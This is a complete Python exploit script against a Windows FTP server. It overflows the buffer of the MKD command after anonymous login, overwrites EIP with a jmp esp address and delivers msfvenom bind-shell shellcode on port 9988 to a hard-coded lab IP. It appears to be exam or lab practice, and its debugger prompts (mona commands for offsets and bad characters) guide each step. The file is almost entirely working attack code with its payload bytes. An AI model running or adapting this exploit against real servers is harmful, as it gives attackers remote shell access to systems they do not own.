#! /usr/bin/python

import socket

offset = 247
buff_size = 1015
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa3Aj4Aj5Aj6A ... "
HOST = '192.168.211.222'
PORT = 21
bytearray = "x01x02x03x04x05x06x07x08x09x0ax0bx0cx0dx0ex0fx10x11x12x13x14x15x16x17x18x19x1ax1bx1cx1dx1ex1fx20x21x22x23x24x25x26x27x28x29x2ax2bx2cx2dx2ex2fx30x31x32x33x34x35x36x37x38x39x3ax3bx3cx3dx3ex3fx40x41x42x43x44x45x46x47x48x49x4ax4bx4cx4dx4ex4fx50x51x52x53x54x55x56x57x58x59x5ax5bx5cx5dx5ex5fx60x61x62x63x64x65x66x67x68x69x6ax6bx6cx6dx6ex6fx70x71x72x73x74x75x76x77x78x79x7ax7bx7cx7dx7ex7fx80x81x82x83x84x85x86x87x88x89x8ax8bx8cx8dx8ex8fx90x91x92x93x94x95x96x97x98x99x9ax9bx9cx9dx9ex9fxa0xa1xa2xa3xa4xa5xa6xa7xa8xa9xaaxabxacxadxaexafxb0xb1xb2xb3xb4xb5xb6xb7xb8xb9xbaxbbxbcxbdxbexbfxc0xc1xc2xc3xc4xc5xc6xc7xc8xc9xcaxcbxccxcdxcexcfxd0xd1xd2xd3xd4xd5xd6xd7xd8xd9xdaxdbxdcxddxdexdfxe0xe1xe2xe3xe4xe5xe6xe7xe8xe9xeaxebxecxedxeexefxf0xf1xf2xf3xf4xf5xf6xf7xf8xf9xfaxfbxfcxfdxfexff"
badchars = ""

def send_socket_request(host, port, shellcode):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((host, port))

	response = s.recv((1024))
	print(response)

	s.send('USER anonymous\r\n')
	response = s.recv((1024))
	print(response)

	s.send('PASS anonymous\r\n')
	response = s.recv((1024))
	print(response)

	s.send('MKD ' + shellcode + '\r\n')
	response = s.recv((1024))
	print(response)

	s.send('QUIT\r\n')
	s.close


def send_badchars(host, port, offset, preamble_smb, eip_no_littleendian, arr_no_badchars):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((host, port))

	response = s.recv((1024))
	print(response)

	s.send('USER anonymous\r\n')
	response = s.recv((1024))
	print(response)

	s.send('PASS anonymous\r\n')
	response = s.recv((1024))
	print(response)

	s.send('MKD ' + arr_no_badchars + '\r\n')
	response = s.recv((1024))
	print(response)

	s.send('QUIT\r\n')
	s.close
	

def get_buffer0(size=buff_size, smb="A"):
	return smb * size

def get_buffer1(pattern=pattern):
	if len(pattern) != buff_size:
		raise Exception("Lengths mismatch! (len(pattern) (now {}) must be equal to buff_size (now {}))".format(len(pattern), buff_size))
	else:
		print("Dont forget to do <!mona findmsp> from Immunity Debugger!")		
		return 	pattern


def get_buffer2(offset, preamble_smb, eip_smb, eip_size, other_smb, size=buff_size):
	buf = offset * preamble_smb + eip_smb * eip_size 
	print("Now start with finding pointers to ESP to store shellcode in. Do <!mona jmp -r ESP> from Immunity Debugger!")
	return buf + other_smb * (size - len(buf))


def get_buffer3(offset, preamble_smb, eip_no_littleendian, other_smb, size=buff_size):
	buf = offset * preamble_smb + eip_no_littleendian 

	print("Load EIP with <push esp; ret> addr (For example;.)")
	print("Now replace <C>s with the shellcode. Do not forget to remove badchars (func [get_buffer4], variables <bytearray> for init array, <badchars> to define badchars to exclude them from result array), plus dont forget about the size!")

	return buf + other_smb * (size - len(buf))


def get_buffer_4(bytearray, badchars):
	if len(bytearray) == 0:
		print("Do <!mona bytearray -cpb \\x00> from Immunity Debugger! Store result in <bytearray> variable.")
		exit()
	
	ba = bytearray.split('x')
	bc = badchars.split('x')
	bn = ""

	for i in ba:
		if i not in bc:
			bn += "\\x{}".format(i)
	print(bn)



def get_buffer4(offset, preamble_smb, eip_no_littleendian, bytearray_no_badchars, other_smb, size=buff_size):
	buf = offset * preamble_smb + eip_no_littleendian + bytearray_no_badchars

	print("Do <--Follow in Stack--> command from Immunity Debugger to know what chars are bad, exclude them from <bytearray> by adding them to <badchars> without the '\\' (slash) symbol.")
	print("Then replace with the shellcode. Do not forget about the size!")

	return buf + other_smb * (size - len(buf))

def get_buffer5(offset, preamble_smb, eip_no_littleendian, shellcode_no_badchars, other_smb, size=buff_size):
	buf = offset * preamble_smb + eip_no_littleendian + shellcode_no_badchars
	print("Load EIP with <push esp; ret> addr (For example;.)")
	print("Now replace <C>s with the shellcode. Do not forget about the size!")
	return buf + other_smb * (size - len(buf))


#evil = get_buffer0()
#evil = get_buffer1()

# EIP contains normal pattern : 0x69413269 (offset 247)
# ESP (0x00b7fc2c) points at offset 259 in normal pattern (length 756)
# EDI (0x003c1c9a) points at offset 742 in normal pattern (length 273)
#evil = get_buffer2(offset=247, preamble_smb="A", eip_smb="B", eip_size=259-247, other_smb="C", size=buff_size)

# 0x7475d61f  : jmp esp 

eip_no_littleendian = "\x1f\xd6\x75\x74"

# put <jmp esp  ~ 0x7475d61f > to eip
#evil = get_buffer3(offset=247, preamble_smb="A", eip_no_littleendian=eip_no_littleendian, other_smb="C")


#get_buffer_4(bytearray, badchars)
# copy and paste 
#bytearray_no_badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#possible_no_badchars = get_buffer4(offset=247, preamble_smb="A", eip_no_littleendian=eip_no_littleendian, bytearray_no_badchars=bytearray_no_badchars, other_smb="C")

#send_badchars(host=HOST, port=PORT, offset=247, preamble_smb="A", eip_no_littleendian=eip_no_littleendian, arr_no_badchars=possible_no_badchars)

# shellcode from msfvenom
# msfvenom -p windows/shell_bind_tcp LPORT=9988 -a x86 --platform windows -b '\x00\x0a\x0d' -f py

shellcode = ""
buf =  ""
buf += "\xbd\x98\x01\x98\x9d\xd9\xc6\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x53\x31\x6b\x12\x83\xeb\xfc\x03\xf3\x0f\x7a"
buf += "\x68\xff\xf8\xf8\x93\xff\xf8\x9c\x1a\x1a\xc9\x9c\x79"
buf += "\x6f\x7a\x2d\x09\x3d\x77\xc6\x5f\xd5\x0c\xaa\x77\xda"
buf += "\xa5\x01\xae\xd5\x36\x39\x92\x74\xb5\x40\xc7\x56\x84"
buf += "\x8a\x1a\x97\xc1\xf7\xd7\xc5\x9a\x7c\x45\xf9\xaf\xc9"
buf += "\x56\x72\xe3\xdc\xde\x67\xb4\xdf\xcf\x36\xce\xb9\xcf"
buf += "\xb9\x03\xb2\x59\xa1\x40\xff\x10\x5a\xb2\x8b\xa2\x8a"
buf += "\x8a\x74\x08\xf3\x22\x87\x50\x34\x84\x78\x27\x4c\xf6"
buf += "\x05\x30\x8b\x84\xd1\xb5\x0f\x2e\x91\x6e\xeb\xce\x76"
buf += "\xe8\x78\xdc\x33\x7e\x26\xc1\xc2\x53\x5d\xfd\x4f\x52"
buf += "\xb1\x77\x0b\x71\x15\xd3\xcf\x18\x0c\xb9\xbe\x25\x4e"
buf += "\x62\x1e\x80\x05\x8f\x4b\xb9\x44\xd8\xb8\xf0\x76\x18"
buf += "\xd7\x83\x05\x2a\x78\x38\x81\x06\xf1\xe6\x56\x68\x28"
buf += "\x5e\xc8\x97\xd3\x9f\xc1\x53\x87\xcf\x79\x75\xa8\x9b"
buf += "\x79\x7a\x7d\x31\x71\xdd\x2e\x24\x7c\x9d\x9e\xe8\x2e"
buf += "\x76\xf5\xe6\x11\x66\xf6\x2c\x3a\x0f\x0b\xcf\x63\xd4"
buf += "\x82\x29\x01\xc4\xc2\xe2\xbd\x26\x31\x3b\x5a\x58\x13"
buf += "\x13\xcc\x11\x75\xa4\xf3\xa1\x53\x82\x63\x2a\xb0\x16"
buf += "\x92\x2d\x9d\x3e\xc3\xba\x6b\xaf\xa6\x5b\x6b\xfa\x50"
buf += "\xff\xfe\x61\xa0\x76\xe3\x3d\xf7\xdf\xd5\x37\x9d\xcd"
buf += "\x4c\xee\x83\x0f\x08\xc9\x07\xd4\xe9\xd4\x86\x99\x56"
buf += "\xf3\x98\x67\x56\xbf\xcc\x37\x01\x69\xba\xf1\xfb\xdb"
buf += "\x14\xa8\x50\xb2\xf0\x2d\x9b\x05\x86\x31\xf6\xf3\x66"
buf += "\x83\xaf\x45\x99\x2c\x38\x42\xe2\x50\xd8\xad\x39\xd1"
buf += "\xe8\xe7\x63\x70\x61\xae\xf6\xc0\xec\x51\x2d\x06\x09"
buf += "\xd2\xc7\xf7\xee\xca\xa2\xf2\xab\x4c\x5f\x8f\xa4\x38"
buf += "\x5f\x3c\xc4\x68"

shellcode = buf

evil = get_buffer5(offset=247, preamble_smb="A", eip_no_littleendian=eip_no_littleendian+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90", shellcode_no_badchars=shellcode, other_smb="C", size=buff_size)
send_socket_request(HOST, PORT, evil)





